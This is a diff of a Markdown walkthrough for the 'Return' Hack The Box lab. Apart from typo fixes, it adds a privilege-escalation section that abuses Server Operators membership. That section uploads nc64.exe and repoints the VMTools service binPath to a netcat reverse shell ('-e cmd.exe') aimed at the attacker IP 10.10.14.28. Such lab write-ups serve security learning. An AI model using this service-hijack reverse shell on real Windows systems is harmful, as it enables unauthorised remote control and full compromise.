@@ -160,7 +160,7 @@ connect to [10.10.14.28] from (UNKNOWN) [10.10.11.108] 54344
 
 <br />
 
-`Crackmapexec` shows as that the domain name is `return.local` and another `SMB` information:
+`Crackmapexec` shows us that the domain name is `return.local` and another `SMB` information:
 
 <br />
 
@@ -193,7 +193,7 @@ SMB         10.10.11.108    445    PRINTER          SYSVOL          READ        
 
 Yes!! It works!!
 
-But now let's `check` something more interesting. Can we use the same `password` to log into de `Windows` System with `evil-winrm`?
+But let's `check` something more interesting. Can we use the same `password` to log into de `Windows` System with `evil-winrm`?
 
 <br />
 
@@ -222,7 +222,7 @@ We did it!! User flag earned, come on with the privilege escalation!!
 
 <br />
 
-Afther spending some time enumrating the system, we find the following:
+Afther spending some time enumerating the `system`, we find the following:
 
 <br />
 
@@ -249,12 +249,41 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
 <br />
 
-As we can see, we are into the `"Server Operators"` group.
+As we can see, the user `svc-printer` is into the `"Server Operators"` group.
 
-This represents a significant oversight by the system `administrators`, because if we are in this group, we can `start` and `stop` services.
+This represents a significant oversight by the system `administrators`, because members of this group, can `start` and `stop` services.
 
 <br />
 
 ## Malicious Service:
+
+<br />
+
+There is a really good [Hacking Article](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/) that explains very well how to escalate in this situation.
+
+We are going to `create` a malicious service that is going to execute `nc64.exe`, so first of all, we need to `upload` it to the victim machine:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> upload nc64.exe
+                                        
+Info: Uploading /opt/nc64.exe to C:\Users\svc-printer\Desktop\nc64.exe
+                                        
+Data: 60360 bytes of 60360 bytes copied
+                                        
+Info: Upload successful!
+```
+
+<br />
+
+After that, we proceed to create a `service` introducing the `binary` path:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd.exe 10.10.14.28 443"
+[SC] ChangeServiceConfig SUCCESS
+```
 
 <br />
